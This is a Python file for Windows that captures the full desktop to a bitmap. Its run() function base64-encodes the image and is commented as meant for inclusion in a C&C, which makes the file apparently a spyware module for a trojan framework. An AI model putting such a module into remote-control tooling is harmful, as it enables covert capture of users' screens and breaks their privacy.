import base64
import win32api
import win32con
import win32gui
import win32ui


def get_dimensions():
	# Determine the size of the screen (or screens)
	width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
	height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
	left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
	top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
	return width, height, left, top


def make_screenshot(name='screenshot'):
	# Handle to the entire desktop and pass in desktop handle
	hdesktop = win32gui.GetDesktopWindow()
	width, height, left, top = get_dimensions()

	# Device context and create a memory-based device context
	desktop_dc = win32gui.GetWindowDC(hdesktop)
	img_dc = win32ui.CreateDCFromHandle(desktop_dc)
	mem_dc = img_dc.CreateCompatibleDC()

	# Create a bitmap object set it to the device context
	screenshot = win32ui.CreateBitmap()
	screenshot.CreateCompatibleBitmap(img_dc, width, height)
	mem_dc.SelectObject(screenshot)

	# Take a bit-for-bit copy of the desktop image and store it in the memory-based
	# context
	mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
	# Dump this image to disk
	screenshot.SaveBitmapFile(mem_dc, f'{name}.bmp')
	mem_dc.DeleteDC()
	win32gui.DeleteObject(screenshot.GetHandle())


def run():
	# For inclusion in a C&C
	make_screenshot()
	with open('screenshot.bmp', 'rb') as file:
		img = base64.b64encode(file.read())
	return img


if __name__ == '__main__':
	make_screenshot()
